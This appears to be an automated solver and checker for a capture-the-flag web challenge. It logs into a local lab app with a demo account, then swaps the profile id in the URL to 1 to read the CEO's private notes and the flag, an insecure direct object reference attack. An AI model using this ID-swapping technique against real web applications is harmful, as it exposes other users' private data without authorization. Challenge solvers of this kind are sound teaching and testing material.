#!/usr/bin/env python3
"""Automated solver for challenge 3 - employee-profile.

Steps:
  1. Check that the login page, and /profile?id=1 while logged out, do not leak
     the flag.
  2. Sign in with the demo account (guest / guest123); the app redirects to
     /profile?id=105, and that ordinary profile must not contain the flag.
  3. Change the id in the URL to 1 (the CEO) and read the flag from the profile
     notes. The server never checks that the requested profile belongs to the
     logged-in user.
"""

import re
import sys

import requests

FLAG_RE = re.compile(r"ingehack\{[^}]+\}")
DEMO_USER = "guest"
DEMO_PASSWORD = "guest123"


def log(message):
    print("[*] " + message, file=sys.stderr)


def fail(message):
    print("[-] " + message, file=sys.stderr)
    sys.exit(1)


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8003"
    session = requests.Session()

    # 1. Sanity checks: nothing public should expose the flag.
    login_page = session.get(base + "/login", timeout=10)
    login_page.raise_for_status()
    if FLAG_RE.search(login_page.text):
        fail("the flag is visible on the login page")

    unauth = session.get(base + "/profile", params={"id": 1}, timeout=10)
    unauth.raise_for_status()
    if FLAG_RE.search(unauth.text):
        fail("an unauthenticated request can read the CEO profile")
    log("logged-out requests are redirected to the login page")

    # 2. Log in with the advertised demo account.
    logged_in = session.post(
        base + "/login",
        data={"username": DEMO_USER, "password": DEMO_PASSWORD},
        timeout=10,
    )
    logged_in.raise_for_status()
    if "Guest User" not in logged_in.text:
        fail("login with the demo account failed")

    # The redirect lands on the guest's own profile: /profile?id=105.
    if "id=105" not in logged_in.url:
        fail("unexpected post-login URL: " + logged_in.url)
    if FLAG_RE.search(logged_in.text):
        fail("the guest's own profile contains the flag")
    log("signed in as guest and redirected to /profile?id=105")
    log("guest profile does not contain the flag")

    # 3. IDOR: swap the id for the CEO's id and read the private notes.
    target = session.get(base + "/profile", params={"id": 1}, timeout=10)
    target.raise_for_status()
    match = FLAG_RE.search(target.text)
    if not match:
        fail("flag not found on /profile?id=1")
    log("requested /profile?id=1 as guest")
    print(match.group(0))


if __name__ == "__main__":
    main()
